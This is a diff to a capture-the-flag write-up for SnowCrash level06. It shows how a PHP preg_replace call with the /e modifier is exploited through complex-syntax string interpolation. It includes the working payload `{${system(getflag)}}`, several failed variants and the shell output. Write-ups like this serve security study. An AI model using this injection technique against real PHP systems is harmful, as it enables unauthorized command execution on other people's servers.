@@ -77,33 +77,40 @@ If we `cat level06.php` the file is hard to read, so I re-wrote it and study it:
     print $r;
 ?>
 ```
+```bash
+level06@SnowCrash:~$ ./level06 hello
+PHP Warning:  file_get_contents(hello): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
+```
+We seems to need a file as an argument.
 
-
-`level06` seems to be executing `level06.php`
-
-`./level06.php` </br>
-PHP Notice:  Undefined offset: 1 in /home/user/level06/level06.php on line 5</br>
-PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5</br>
-PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4</br>
-
-
-`./level06 hello` </br>
-PHP Warning:  file_get_contents(hello): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4</br>
-We seems to need a file as argument.
-
-
+Theorical steps:
+- Create a file with a syntax matching the regex
+- So a part of the string (the second group) can be sent to function y
+- In function y the string will be transformed (or not) then returned
+- The returned string will be executed by the e modifier
 https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/ </br>
 https://www.php.net/manual/en/language.types.string.php </br>
 
-So we need to find a syntax matching the regex, so the second group (.* which stands for one or more of any character except line breaks) can be sent to function y, in which the string will be transformed (or not) then returned, so as to be executed by the e modifier.
-
+In reality:
 Struggled **a lot** to find good syntax, tried: </br>
 `echo '[x $(getflag)]' > /tmp/flag && ./level06 /tmp/flag` </br>
 `echo '[x ${system(getflag)}]' > /tmp/flag && ./level06 /tmp/flag` </br>
-and a lot of variants of it. 
+and a lot of variants of it...
 
-To finally come accross the good syntax: `echo '[x {${system(getflag)}}]' > /tmp/flag && ./level06 /tmp/flag`
+## Solution 
 
-`echo "This is the value of the var named $name: {${$name}}";` </br>
-https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex </br>
-https://www.voidsecurity.in/2012/12/exploit-exercise-php-pregreplace.html </br>
+Let's find the good syntax:</br>
+https://www.php.net/manual/fr/language.types.string.php</br>
+https://www.voidsecurity.in/2012/12/exploit-exercise-php-pregreplace.html</br>
+https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex 
+
+Finally:
+```bash
+level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > /tmp/flag && ./level06 /tmp/flag
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXX
+PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXX in /home/user/level06/level06.php(4) : regexp code on line 1
+
+```
+
+
